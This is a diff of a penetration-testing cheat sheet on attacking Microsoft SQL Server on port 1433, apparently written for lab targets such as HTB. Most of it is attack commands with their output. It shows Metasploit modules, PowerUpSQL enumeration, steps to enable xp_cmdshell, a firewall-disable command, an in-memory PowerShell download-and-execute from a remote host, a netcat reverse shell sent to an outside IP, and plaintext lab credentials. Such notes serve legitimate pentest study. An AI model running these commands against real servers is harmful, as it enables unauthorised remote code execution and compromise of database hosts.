@@ -1,8 +1,10 @@
 ---
-description: MSSQL - Microsoft SQL service. typically runs on TCP port 1433.
+description: >-
+  MSSQL - Microsoft SQL service. typically runs on TCP port 1433 & Hidden mode
+  port - 2433
 ---
 
-# MSSQL
+# 1433 - MSSQL
 
 ## Enumeration
 
@@ -16,6 +18,15 @@ nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [I
 use auxiliary/admin/mssql/mssql_enum
 set RHOSTS [IP]
 exploit
+
+```
+
+#### mssql\_exec&#x20;
+
+The mssql\_exec admin module takes advantage of the xp\_cmdshell stored procedure to execute commands on the remote system. If you have acquired or guessed MSSQL admin credentials, this can be a very useful module.&#x20;
+
+```
+msf auxiliary(mssql_exec) > set CMD netsh firewall set opmode disable
 ```
 
 ### Enumerate SQL login accounts
@@ -34,6 +45,41 @@ exploit
 use auxiliary/admin/mssql/mssql_enum_domain_accounts
 set RHOSTS [IP]
 exploit
+```
+
+### PowerUpSQL
+
+PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server&#x20;
+
+Link: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)&#x20;
+
+Example:&#x20;
+
+```
+PS /opt/PowerUpSQL> Import-Module .\PowerUpSQL.psd1  
+PS /opt/PowerUpSQL> Get-SQLInstanceDomain -Verbose 
+
+ComputerName     : sql01.HTB.local
+Instance         : sql01.HTB.local,1433
+DomainAccountSid : 1500000521000221246588323062601712516458121134400
+DomainAccount    : MSSQLSERVER$
+DomainAccountCn  : MSSQLSERVER
+Service          : MSSQLSvc
+Spn              : MSSQLSvc/sql01.HTB.local
+LastLogon        : 13/01/2021 02:56
+Description      : 
+
+PS /opt/PowerUpSQL> Get-SQLInstanceDomain | Get-SQLConnectionTest
+
+ComputerName          Instance                   Status        
+------------          --------                   ------        
+sql01.HTB.local       sql01.HTB.local,1433       Accessible     
+```
+
+Or load into memory
+
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.0.1/PowerUpSQL.ps1")
 ```
 
 ## Password attack
@@ -95,18 +141,54 @@ exploit
 
 ## Connecting to MSSQL
 
-### Using MSSQL-CLI Python utility
+Connect using one of the following options:&#x20;
+
+### sqsh
 
 ```
-python3 -m mssqlcli.main -S [IP] -U sa -P Password123
+sqsh -S someserver -U sa -P password
 ```
 
-### SQLCMD
+### metasploit
+
+metasploit (mssql\_login)&#x20;
+
+```
+msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
+```
+
+### mssqclient
+
+Impacket script [mssqclient](broken-reference)&#x20;
+
+```
+mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
+```
+
+### sqlcmd
+
+sqlcmd. To use SQL Server Authentication, you must specify a user name and password by using the -U and -P options.
 
 ```
 sqlcmd -S [IP] -U admin -P Password123
     1> select @@version
     2> go
+```
+
+```
+sqlcmd -y0 -d ADSync -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+```
+
+### crackmapexec
+
+```
+cme mssql 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
+```
+
+### Using MSSQL-CLI Python utility
+
+```
+python3 -m mssqlcli.main -S [IP] -U sa -P Password123
 ```
 
 ## Common SQL Queries
@@ -134,4 +216,44 @@ http://10.10.14.9/nc64.exe -outfile nc64.exe"
 
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
 10.10.14.9 443"
+```
+
+MSSQL 2003 commands
+
+{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" %}
+
+## MSSQL 2017 Commands
+
+Current user’s permissions:
+
+```
+SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
+entity_name    subentity_name    permission_name 
+------------   ---------------   ------------------ 
+server                           CONNECT SQL 
+server                           VIEW ANY DATABASE
+```
+
+Check out the databases available:&#x20;
+
+```
+SQL> SELECT name FROM master.sys.databases 
+name 
+----------- 
+master 
+tempdb 
+model 
+msdb 
+volume 
+```
+
+I can look for user generated tables on those databases:&#x20;
+
+```
+SQL> use volume 
+[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume 
+[*] INFO(QUERIER): Line 1: Changed database context to 'volume'. 
+SQL> SELECT name FROM sysobjects WHERE xtype = 'U' 
+name 
+------------
 ```
